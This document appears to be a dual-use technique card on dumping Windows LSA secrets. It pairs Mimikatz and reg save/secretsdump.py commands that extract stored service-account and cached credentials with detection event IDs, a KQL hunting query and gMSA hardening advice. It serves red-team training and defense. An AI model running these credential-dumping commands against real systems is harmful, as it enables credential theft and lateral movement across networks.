# [CA-DUMP-003]: LSA Secrets Dump

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-003 |
| **MITRE ATT&CK v18.1** | [OS Credential Dumping: LSA Secrets (T1003.004)](https://attack.mitre.org/techniques/T1003/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The Local Security Authority (LSA) stores sensitive secrets in the Registry under `HKLM\SECURITY\Policy\Secrets`. These secrets include Service Account passwords (configured in Services), Scheduled Task credentials, and cached domain logon verifiers.
- **Attack Surface:** Local Registry (SYSTEM hive) and LSA memory.
- **Business Impact:** **Lateral Movement**. Often yields cleartext passwords for service accounts that run on multiple machines.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** SYSTEM (usually obtained via privilege escalation from Admin).
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [Impacket (secretsdump.py)](https://github.com/fortra/impacket)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Exploitation (Mimikatz)**
Read LSA secrets from the registry on a live system.
```powershell
token::elevate
lsadump::secrets
```

**Step 2: Exploitation (Offline)**
Dump the registry hives and extract offline.
```cmd
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save
# On attacker machine:
secretsdump.py -system system.save -security security.save LOCAL
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4663 | Access to `HKLM\SECURITY\Policy\Secrets` key. |
| **Sysmon** | 1 | Process accessing `reg.exe` with `save` arguments targeting SYSTEM/SECURITY. |

#### 5.2 Sentinel (KQL)
```kusto
ProcessCreationEvents
| where ProcessCommandLine has "reg" and ProcessCommandLine has "save"
| where ProcessCommandLine has "HKLM" and (ProcessCommandLine has "Security" or ProcessCommandLine has "System")
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Service Accounts:** Use **Group Managed Service Accounts (gMSA)**. gMSA passwords are managed by AD and not stored statically in the LSA secrets in a way that is easily reusable by humans.
*   **EDR:** Monitor registry access to the Security hive.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001] (Admin Access)
> **Next Logical Step:** [LAT-AD-001] (Using the extracted service account to move laterally)
